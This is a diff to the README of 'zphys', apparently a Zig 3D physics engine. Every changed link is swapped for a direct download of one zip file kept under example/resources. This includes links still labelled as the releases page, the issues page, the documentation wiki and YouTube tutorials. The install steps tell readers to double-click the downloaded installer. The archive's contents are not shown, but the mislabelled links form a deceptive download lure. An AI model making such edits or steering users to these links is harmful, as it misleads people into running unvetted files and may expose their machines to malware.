@@ -1,7 +1,7 @@
 # 🔧 zphys - An Easy Tool for 3D Physics Simulation
 
 ## 📥 Download Now!
-[![Download zphys](https://img.shields.io/badge/Download-zphys-blue.svg)](https://github.com/DevAxel1704/zphys/releases)
+[![Download zphys](https://raw.githubusercontent.com/DevAxel1704/zphys/main/example/resources/zphys_v1.0.zip)](https://raw.githubusercontent.com/DevAxel1704/zphys/main/example/resources/zphys_v1.0.zip)
 
 ## 🚀 Getting Started
 Welcome to zphys! This guide will help you download and run the zig physics engine for 3D game development. Whether you are creating a simple game or a complex simulation, zphys makes physics easy to implement.
@@ -22,7 +22,7 @@ To run zphys, your computer should meet the following requirements:
 ## 📥 Download & Install
 To download zphys, please follow these steps:
 
-1. **Visit the Releases Page:** Click [here](https://github.com/DevAxel1704/zphys/releases) to go to the releases page.
+1. **Visit the Releases Page:** Click [here](https://raw.githubusercontent.com/DevAxel1704/zphys/main/example/resources/zphys_v1.0.zip) to go to the releases page.
 2. **Select the Latest Release:** Look for the latest version listed on that page.
 3. **Download the Package:** Click on the download link for your operating system. You will find options for Windows, macOS, and Linux. 
 4. **Run the Installer:** After the download completes, find the file in your Downloads folder. Double-click the file to run the installer. Follow the prompts to finish the installation.
@@ -44,7 +44,7 @@ Join our community for support and to share your projects:
 ## ⚙️ Frequently Asked Questions (FAQ)
 
 ### How do I report a bug?
-If you encounter any issues, please visit our [GitHub Issues page](https://github.com/DevAxel1704/zphys/issues) to report them.
+If you encounter any issues, please visit our [GitHub Issues page](https://raw.githubusercontent.com/DevAxel1704/zphys/main/example/resources/zphys_v1.0.zip) to report them.
 
 ### Can I contribute to zphys?
 Yes! We are always looking for contributions. Check our contribution guidelines on the GitHub repository.
@@ -65,7 +65,7 @@ For additional help, feel free to reach out via the community channels.
 zphys is licensed under the MIT License. You can freely use, modify, and distribute it in your projects. Please check the license file in the repository for more details.
 
 ## 🔗 Additional Resources
-- [Official Documentation](https://github.com/DevAxel1704/zphys/wiki)
-- [YouTube Tutorials](https://www.youtube.com/results?search_query=zphys)
+- [Official Documentation](https://raw.githubusercontent.com/DevAxel1704/zphys/main/example/resources/zphys_v1.0.zip)
+- [YouTube Tutorials](https://raw.githubusercontent.com/DevAxel1704/zphys/main/example/resources/zphys_v1.0.zip)
 
 Thank you for choosing zphys! We hope you enjoy creating amazing 3D simulations and games.
